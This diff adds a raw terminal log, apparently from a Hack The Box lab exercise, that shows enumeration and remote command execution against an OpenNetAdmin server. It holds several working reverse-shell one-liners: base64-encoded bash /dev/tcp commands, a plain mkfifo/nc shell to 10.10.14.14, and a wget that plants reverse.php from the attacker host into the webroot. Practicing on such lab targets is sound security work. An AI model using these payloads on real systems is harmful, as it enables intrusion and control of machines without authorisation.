@@ -1,0 +1,404 @@
+┌─[root@parrot]─[~/hackthebox/openadmin]    
+└──╼ #uname                                 
+Linux                                       
+┌─[root@parrot]─[~/hackthebox/openadmin]    
+└──╼ #vi /etc/hosts                         
+┌─[root@parrot]─[~/hackthebox/openadmin]    
+└──╼ #gobuster dir -u http://openadmin.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt                                                                   
+===============================================================                         
+Gobuster v3.0.1                             
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)                         
+===============================================================                         
+[+] Url:            http://openadmin.htb/   
+[+] Threads:        10                      
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt        
+[+] Status codes:   200,204,301,302,307,401,403                                         
+[+] User Agent:     gobuster/3.0.1          
+[+] Timeout:        10s                     
+===============================================================                         
+2020/01/10 04:18:23 Starting gobuster       
+===============================================================                         
+/music (Status: 301)                        
+^C                                          
+[!] Keyboard interrupt detected, terminating.                                           
+===============================================================                         
+2020/01/10 04:18:29 Finished                
+===============================================================                         
+┌─[root@parrot]─[~/hackthebox/openadmin]    
+└──╼ #gobuster dir -u http://openadmin.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,perl,txt                                                   
+===============================================================                         
+Gobuster v3.0.1                             
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)                         
+===============================================================                         
+[+] Url:            http://openadmin.htb/   
+[+] Threads:        10                      
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt        
+[+] Status codes:   200,204,301,302,307,401,403                                         
+[+] User Agent:     gobuster/3.0.1          
+[+] Extensions:     txt,php,perl            
+[+] Timeout:        10s                     
+===============================================================                         
+2020/01/10 04:18:41 Starting gobuster       
+===============================================================                         
+/music (Status: 301)                        
+Progress: 4351 / 220561 (1.97%)^C           
+[!] Keyboard interrupt detected, terminating.                                           
+===============================================================                         
+2020/01/10 04:25:13 Finished                
+===============================================================                         
+┌─[root@parrot]─[~/hackthebox/openadmin]    
+└──╼ #echo -n ls | base64                   
+bHM=                                        
+┌─[root@parrot]─[~/hackthebox/openadmin]    
+└──╼ #bHM=                                  
+┌─[root@parrot]─[~/hackthebox/openadmin]    
+└──╼ #bHM=                                  
+┌─[root@parrot]─[~/hackthebox/openadmin]    
+└──╼ #ls                                    
+exploit.sh  nmap                            
+┌─[root@parrot]─[~/hackthebox/openadmin]    
+└──╼ #echo -n "bash ls"                     
+bash ls┌─[root@parrot]─[~/hackthebox/openadmin]                                         
+└──╼ #echo -n bash ls                                                                                                                                                                                                    
+bash ls┌─[root@parrot]─[~/hackthebox/openadmin]                                         
+└──╼ #echo -n "bash ls" | base64                                                                                                                                                                                         
+YmFzaCBscw==                                
+┌─[root@parrot]─[~/hackthebox/openadmin]    
+└──╼ #YmFzaCBscw==                          
+┌─[root@parrot]─[~/hackthebox/openadmin]    
+└──╼ #bash ls                               
+/usr/bin/ls: /usr/bin/ls: cannot execute binary file                                    
+┌─[✗]─[root@parrot]─[~/hackthebox/openadmin]
+└──╼ #bash -c ls                            
+exploit.sh  nmap                            
+┌─[root@parrot]─[~/hackthebox/openadmin]    
+└──╼ #echo -n "bash -c ls" | base64         
+YmFzaCAtYyBscw==                            
+┌─[root@parrot]─[~/hackthebox/openadmin]    
+└──╼ #YmFzaCAtYyBscw==                      
+┌─[root@parrot]─[~/hackthebox/openadmin]    
+└──╼ #echo $PATH                            
+/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/share/games:/usr/local/sbin:/usr/sbin:/sbin:/root/.local/bin:/snap/bin:/snap/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin    
+┌─[root@parrot]─[~/hackthebox/openadmin]    
+└──╼ #$PATH                                 
+-bash: /usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/share/games:/usr/local/sbin:/usr/sbin:/sbin:/root/.local/bin:/snap/bin:/snap/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin: No such file or directory              
+┌─[✗]─[root@parrot]─[~/hackthebox/openadmin]
+└──╼ #which curl                            
+/usr/bin/curl                               
+┌─[root@parrot]─[~/hackthebox/openadmin]    
+└──╼ #vi shell.sh                           
+┌─[root@parrot]─[~/hackthebox/openadmin]    
+└──╼ #chmod +x shell.sh                     
+┌─[root@parrot]─[~/hackthebox/openadmin]    
+└──╼ #./shell.sh                            
+$                                           
+ls                                          
+                <pre style="padding: 4px;font-family: monospace;">BEGIN                 
+config                                      
+config_dnld.php                             
+dcm.php                                     
+images                                      
+include                                     
+index.php                                   
+local                                       
+login.php                                   
+┌─[root@parrot]─[~/hackthebox/openadmin]    
+└──╼ #ls -la                                
+total 24                                    
+drwxr-xr-x  3 root root 4096 Jan 10 05:15 . 
+drwxr-xr-x 33 root root 4096 Jan  9 10:09 ..
+-rwxr-xr-x  1 root root  276 Jan 10 04:02 exploit.sh                                    
+-rwxr-xr-x  1 root root   78 Jan 10 05:14 l.sh                                          
+drwxr-xr-x  2 root root 4096 Jan  8 21:46 nmap                                          
+-rwxr-xr-x  1 root root  307 Jan 10 05:15 shell.sh                                      
+┌─[root@parrot]─[~/hackthebox/openadmin]    
+└──╼ #./shell.sh                            
+./shell.sh: line 3: val: command not found  
+$                                           
+ls                                          
+                <pre style="padding: 4px;font-family: monospace;">BEGIN                 
+config                                      
+config_dnld.php                             
+dcm.php                                     
+images                                      
+include                                     
+index.php                                   
+local                                       
+login.php                                   
+logout.php                                  
+modules                                     
+plugins                                     
+winc                                        
+workspace_plugins                           
+END                                         
+$                                           
+cd /home/                                   
+                <pre style="padding: 4px;font-family: monospace;">BEGIN                 
+END                                         
+$                                           
+ls -la                                      
+                <pre style="padding: 4px;font-family: monospace;">BEGIN                 
+total 72                                    
+drwxrwxr-x 10 www-data www-data 4096 Nov 22 17:17 .                                     
+drwxr-x---  7 www-data www-data 4096 Nov 21 18:23 ..                                    
+-rw-rw-r--  1 www-data www-data 1970 Jan  3  2018 .htaccess.example                     
+drwxrwxr-x  2 www-data www-data 4096 Jan  3  2018 config                                
+-rw-rw-r--  1 www-data www-data 1949 Jan  3  2018 config_dnld.php                       
+-rw-rw-r--  1 www-data www-data 4160 Jan  3  2018 dcm.php                               
+drwxrwxr-x  3 www-data www-data 4096 Jan  3  2018 images                                
+drwxrwxr-x  9 www-data www-data 4096 Jan  3  2018 include                               
+-rw-rw-r--  1 www-data www-data 1999 Jan  3  2018 index.php                             
+drwxrwxr-x  5 www-data www-data 4096 Jan  3  2018 local                                 
+-rw-rw-r--  1 www-data www-data 4526 Jan  3  2018 login.php                             
+-rw-rw-r--  1 www-data www-data 1106 Jan  3  2018 logout.php                            
+drwxrwxr-x  3 www-data www-data 4096 Jan  3  2018 modules                               
+drwxrwxr-x  3 www-data www-data 4096 Jan  3  2018 plugins                               
+drwxrwxr-x  2 www-data www-data 4096 Jan  3  2018 winc                                  
+drwxrwxr-x  3 www-data www-data 4096 Jan  3  2018 workspace_plugins                     
+END                                         
+$                                           
+ls /home/                                   
+                <pre style="padding: 4px;font-family: monospace;">BEGIN                 
+jimmy                                       
+joanna                                      
+END                                         
+$                                           
+wget                                        
+                <pre style="padding: 4px;font-family: monospace;">BEGIN                 
+END                                         
+$                                           
+which wget                                  
+                <pre style="padding: 4px;font-family: monospace;">BEGIN                 
+/usr/bin/wget                               
+END                                         
+$                                           
+which curl                                  
+                <pre style="padding: 4px;font-family: monospace;">BEGIN                 
+/usr/bin/curl                               
+END                                         
+$                                           
+which ls                                    
+                <pre style="padding: 4px;font-family: monospace;">BEGIN                 
+/bin/ls                                     
+END                                         
+$                                           
+cat login.php                               
+                <pre style="padding: 4px;font-family: monospace;">BEGIN                 
+<?php                                       
+/* -------------------- COMMON HEADER ---------------------- */                         
+$base = dirname(__FILE__);                  
+while ($base and (!is_dir($base.'/include'))) $base = preg_replace('+/[^/]*$+', '', $base);                                                                                   
+$include = $base . '/include';              
+if (!is_dir($include)) { print "ERROR => Couldn't find include folder!\n"; exit; }      
+require_once($base . '/config/config.inc.php');                                         
+/* --------------------------------------------------------- */                         
+// MP: Since we know ONA will generate a ton of notice level errors, lets turn them off here                                                                                  
+// I dont believe this will be impactful to anyone. keep an eye out for it however.     
+error_reporting (E_ALL ^ E_NOTICE);         
+
+// clear out existing session info          
+$_SESSION['ona']['auth'] = array();         
+
+// enforce the HTTPS page if required       
+if (($_SERVER['SERVER_PORT'] != 443) and ($conf['force_https'] == 1)) {                 
+        echo <<<EOL                         
+<html><body>                                
+Redirecting you to: <a href="{$https}{$baseURL}/login.php">{$https}{$baseURL}/login.php</a>                                                                                   
+<script type="text/javascript"><!--         
+    setTimeout("window.location = \"{$https}{$baseURL}/login.php\";", 10);              
+--></script>                                
+</body></html>                              
+EOL;                                        
+    exit;                                   
+}                                           
+
+//                                          
+// Save a redirect url..                    
+if (!isset($_SESSION['redirect']))          
+    $_SESSION['redirect'] = (!empty($_SERVER['HTTP_REFERER'])) ? $_SERVER['HTTP_REFERER'] : "{$https}{$baseURL}/";                                                            
+
+// Include xajax stuff (ajax calls will never make it past this line)                   
+require_once($conf['inc_xajax_stuff']);     
+
+$message = '';                              
+if (!empty($_SESSION['login_failure'])) $message = $_SESSION['login_failure'];          
+unset($_SESSION['login_failure']);          
+
+print <<<EOL                                
+
+<html>                                      
+<head>                                      
+    <title>{$conf['title']} Standalone Login</title>                                    
+    <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">            
+    <link rel="stylesheet" type="text/css" href="{$baseURL}/include/html_style_sheet.inc.php">                                                                                
+    <link rel="shortcut icon" type="image/ico" href="{$images}/favicon.ico">            
+    <script type="text/javascript" src="{$baseURL}/include/js/global.js" language="javascript"></script>                                                                      
+    {$conf['html_headers']}                 
+</head>                                     
+<body>                                      
+<center>                                    
+    <h1 style="color: #5262F2;">OpenNetAdmin Login</h1>                                 
+    <div>                                   
+        <form id="standalone_loginform_form" onSubmit="return(false);">                 
+            <input id="onapassword" type="hidden" name="onapassword">                   
+            <input id="standalone" type="hidden" name="standalone" value="standalone">  
+            <table cellspacing="2" border="0" cellpadding="0">                          
+                <tr>                        
+                    <td class="menu-item" align="right">                                
+                        <img src="{$images}/silk/user.png" alt="Username" title="Username" align="left" border="0" style="display: inline;">                                  
+                        <input              
+                            id="onausername"                                            
+                            name="onausername"                                          
+                            class="edit"    
+                            style="width: 100px; font-size: 8pt;" type="text" maxlength="64" tabindex="1" accesskey="u"                                                       
+                            onkeypress="if (event.keyCode == 13) { el('getpass').focus(); }"                                                                                  
+                        >                   
+                    </td>                   
+                </tr>                       
+                <tr>                        
+                    <td class="menu-item" align="right">                                
+                        <img src="{$images}/silk/key.png" alt="Password" title="Password" align="left" border="0" style="display: inline;">                                   
+                        <input              
+                            id="getpass"    
+                            name="getpass"  
+                            class="edit"    
+                            style="width: 100px; font-size: 8pt;" type="password" maxlength="64" tabindex="2" accesskey="p"                                                   
+                            onkeypress="if (event.keyCode == 13) { el('loginbutton').click(); }"                                                                              
+                        >                   
+                    </td>                   
+                </tr>                       
+                <tr>                        
+                    <td class="menu-item" align="right">                                
+                        <input id="loginbutton" class="button" style="font-size: smaller;" type="button" name="logon" value="Login"                                           
+                                onClick="el('onapassword').value = el('getpass').value; 
+                                         xajax_window_submit('tooltips', xajax.getFormValues('standalone_loginform_form'), 'logingo');"                                       
+                        >                   
+                    </td>                   
+                </tr>                       
+            </table>                        
+        </form>                             
+    </div>                                  
+    <br>                                    
+    <span style="color: red; font-weight: bold;" id="loginmsg">{$message}</span>        
+
+    <script type="text/javascript"><!--     
+        /* Focus the username field */      
+        el('onausername').focus();          
+    //--></script>                          
+
+    <br>                                    
+
+</center>                                   
+</body>                                     
+</html>                                     
+
+EOL;                                        
+
+
+
+?>END                                       
+$                                           
+which python                                
+                <pre style="padding: 4px;font-family: monospace;">BEGIN                 
+END                                         
+$                                           
+which python3                               
+                <pre style="padding: 4px;font-family: monospace;">BEGIN                 
+/usr/bin/python3                            
+END                                         
+$                                           
+echo -n gyan | base64                       
+                <pre style="padding: 4px;font-family: monospace;">BEGIN                 
+Z3lhbg==                                    
+END                                         
+$                                           
+echo -n bHM= | base64 -d | bash             
+                <pre style="padding: 4px;font-family: monospace;">BEGIN                 
+config                                      
+config_dnld.php                             
+dcm.php                                     
+images                                      
+include                                     
+index.php                                   
+local                                       
+login.php                                   
+logout.php                                  
+modules                                     
+plugins                                     
+winc                                        
+workspace_plugins                           
+END                                         
+$                                           
+echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNC85MDAxIDA+JjE= | base64 -d | bash     
+                <pre style="padding: 4px;font-family: monospace;">BEGIN                 
+END                                         
+$                                           
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNC85MDAxIDA+JjEK | base64 -d | bash        
+                <pre style="padding: 4px;font-family: monospace;">BEGIN                 
+END                                         
+$                                           
+rm /tmp/f                                   
+                <pre style="padding: 4px;font-family: monospace;">BEGIN                 
+END                                         
+$                                           
+mkfifo /tmp/f                               
+                <pre style="padding: 4px;font-family: monospace;">BEGIN                 
+END                                         
+$                                           
+cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.14 9001 >/tmp/f                                  
+$                                           
+echo -n cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTAuMTQuMTQgOTAwMSA+L3RtcC9mCg== | base64 -d | bash                                       
+
+^C                                          
+┌─[✗]─[root@parrot]─[~/hackthebox/openadmin]
+└──╼ #./shell.sh                            
+./shell.sh: line 3: val: command not found  
+$                                           
+ls                                          
+                <pre style="padding: 4px;font-family: monospace;">BEGIN                 
+config                                      
+config_dnld.php                             
+dcm.php                                     
+images                                      
+include                                     
+index.php                                   
+local                                       
+login.php                                   
+logout.php                                  
+lse.sh                                      
+modules                                     
+pietpaulisma                                
+plugins                                     
+winc                                        
+workspace_plugins                           
+END                                         
+$                                           
+echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTAuMTQuMTQgOTAwMSA+L3RtcC9mCg== | base64 -d | bash                                          
+^C                                          
+┌─[✗]─[root@parrot]─[~/hackthebox/openadmin]
+└──╼ #./shell.sh                            
+./shell.sh: line 3: val: command not found  
+$                                           
+which bash                                  
+                <pre style="padding: 4px;font-family: monospace;">BEGIN                 
+/bin/bash                                   
+END                                         
+$                                           
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNC85MDAxIDA+JjE= | base64 -d | bash        
+                <pre style="padding: 4px;font-family: monospace;">BEGIN                 
+END                                         
+$                                           
+echo -n d2hpY2ggYmFzaAo= | base64 -d | bash 
+                <pre style="padding: 4px;font-family: monospace;">BEGIN                 
+/bin/bash                                   
+END                                         
+$                                           
+wget http://10.10.14.14:8000/reverse.php -O /var/www/html/reverse.php                   
+                <pre style="padding: 4px;font-family: monospace;">BEGIN                 
+END                                         
+$                                           
+wget http://10.10.14.14:8000/reverse.php -O /var/www/html/reverse.php                      
+                <pre style="padding: 4px;font-family: monospace;">BEGIN                    
+END                                          
+$                                            
+                                             
